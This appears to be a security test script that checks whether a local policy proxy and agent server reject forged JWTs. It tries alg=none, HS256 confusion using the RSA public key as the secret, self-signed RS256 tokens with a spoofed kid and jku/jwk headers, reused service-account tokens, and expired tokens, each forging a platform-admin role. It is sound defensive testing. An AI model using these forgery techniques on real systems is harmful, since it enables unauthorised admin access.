// P0-1 JWT verification attacks against the running policy-proxy (7200) and agent-server (7400).
// Non-destructive: only forged/invalid tokens; expected outcome is rejection.
import { createRequire } from 'node:module';
import { login, serviceToken, req, decodeJwt, ISSUER, POLICY, AGENT, STUDIO } from './lib.mjs';
const require = createRequire('/Users/psw/Projects/toss-toi-test/services/policy-proxy/package.json');
const jose = require('jose');

const out = [];
const log = (label, r) => { const line = `${label.padEnd(52)} -> ${r.status} ${typeof r.body==='object'?JSON.stringify(r.body).slice(0,80):String(r.body).slice(0,60)}`; out.push(line); console.log(line); };

const alice = await login('alice');
// A registered project owned by alice, for /audit target
const proj = (await req(AGENT + '/projects', { method:'POST', token: alice.access_token, origin: STUDIO, body:{name:'r3-jwt', apiIds:['customers']}})).body;
const projectId = proj.projectId;
console.log('# target project', projectId);

// Endpoint that requires a valid user identity: GET /audit?projectId (owner sees all, else own)
const target = POLICY + '/audit?projectId=' + projectId;

// Baseline: valid alice token works
log('valid alice token', await req(target, { token: alice.access_token, origin: STUDIO }));

// 1) alg=none
{
  const p = decodeJwt(alice.access_token).payload;
  const header = Buffer.from(JSON.stringify({ alg:'none', typ:'JWT', kid:'x' })).toString('base64url');
  const payload = Buffer.from(JSON.stringify({ ...p, realm_access:{roles:['platform-admin']} })).toString('base64url');
  log('alg=none forged platform-admin', await req(target, { token: `${header}.${payload}.`, origin: STUDIO }));
}

// 2) HS256 confusion: sign with the RSA public key (JWKS) used as an HMAC secret
{
  const jwks = await (await fetch(ISSUER + '/protocol/openid-connect/certs')).json();
  const sigKey = jwks.keys.find(k => k.use==='sig' && k.kty==='RSA') ?? jwks.keys[0];
  const pub = await jose.importJWK(sigKey, 'RS256');
  const spki = await jose.exportSPKI(pub);
  const p = decodeJwt(alice.access_token).payload;
  const forged = await new jose.SignJWT({ ...p, realm_access:{roles:['platform-admin']} })
    .setProtectedHeader({ alg:'HS256', kid: sigKey.kid })
    .sign(new TextEncoder().encode(spki));
  log('HS256 confusion (SPKI as secret)', await req(target, { token: forged, origin: STUDIO }));
  // also try raw modulus n as secret
  const forged2 = await new jose.SignJWT({ ...p, realm_access:{roles:['platform-admin']} })
    .setProtectedHeader({ alg:'HS256', kid: sigKey.kid })
    .sign(Buffer.from(sigKey.n, 'base64url'));
  log('HS256 confusion (modulus as secret)', await req(target, { token: forged2, origin: STUDIO }));
}

// 3) Self-signed RS256 with attacker key + spoofed kid + jwku (JWKS cache poisoning attempt)
{
  const { privateKey, publicKey } = await jose.generateKeyPair('RS256');
  const realKid = (await (await fetch(ISSUER + '/protocol/openid-connect/certs')).json()).keys[0].kid;
  const p = decodeJwt(alice.access_token).payload;
  const forged = await new jose.SignJWT({ ...p, realm_access:{roles:['platform-admin']} })
    .setProtectedHeader({ alg:'RS256', kid: realKid })
    .sign(privateKey);
  log('RS256 attacker key + real kid', await req(target, { token: forged, origin: STUDIO }));
  const jwk = await jose.exportJWK(publicKey);
  const forgedJku = await new jose.SignJWT({ ...p, realm_access:{roles:['platform-admin']} })
    .setProtectedHeader({ alg:'RS256', kid:'evil', jku:'http://127.0.0.1:9/certs', jwk })
    .sign(privateKey);
  log('RS256 attacker key + jku/jwk header', await req(target, { token: forgedJku, origin: STUDIO }));
}

// 4) aud / iss / exp / nbf tampering on an otherwise-real token is impossible without re-sign;
//    test a service-account token (valid signature, wrong azp) reused as a user token.
{
  const svc = await serviceToken('toi-policy-proxy','TOI_POLICY_CLIENT_SECRET');
  log('policy-proxy service token as user (audit)', await req(target, { token: svc, origin: STUDIO }));
  const svc2 = await serviceToken('toi-agent-server','TOI_AGENT_CLIENT_SECRET');
  log('agent service token -> policy /audit', await req(target, { token: svc2, origin: STUDIO }));
  // service token to agent-server user API
  log('agent service token -> agent GET /projects/:id', await req(`${AGENT}/projects/${projectId}`, { token: svc2, origin: STUDIO }));
  // service token to agent-server internal membership WITHOUT service being policy-proxy
  log('agent svc -> agent internal membership', await req(`${AGENT}/internal/projects/${projectId}/membership`, { token: svc2 }));
  // policy-proxy service token -> agent internal membership (correct service, no origin) : allowed path
  log('policy svc -> agent internal membership (no origin)', await req(`${AGENT}/internal/projects/${projectId}/membership`, { token: svc }));
  log('policy svc -> agent internal membership (studio origin)', await req(`${AGENT}/internal/projects/${projectId}/membership`, { token: svc, origin: STUDIO }));
}

// 5) audience: request a token for a different client's audience is not directly possible; test missing/short bearer
log('empty bearer', await req(target, { token: '', origin: STUDIO }));
log('garbage bearer', await req(target, { token: 'not.a.jwt', origin: STUDIO }));
log('expired real token (exp in past, re-signed w/ attacker)', await (async()=>{
  const { privateKey } = await jose.generateKeyPair('RS256');
  const p = decodeJwt(alice.access_token).payload;
  const t = await new jose.SignJWT({ ...p, exp: Math.floor(Date.now()/1000)-10 }).setProtectedHeader({alg:'RS256',kid:'x'}).sign(privateKey);
  return req(target, { token: t, origin: STUDIO });
})());

import { writeFileSync } from 'node:fs';
writeFileSync(new URL('./p01-jwt.out', import.meta.url), out.join('\n')+'\n');
console.log('\n# wrote p01-jwt.out');
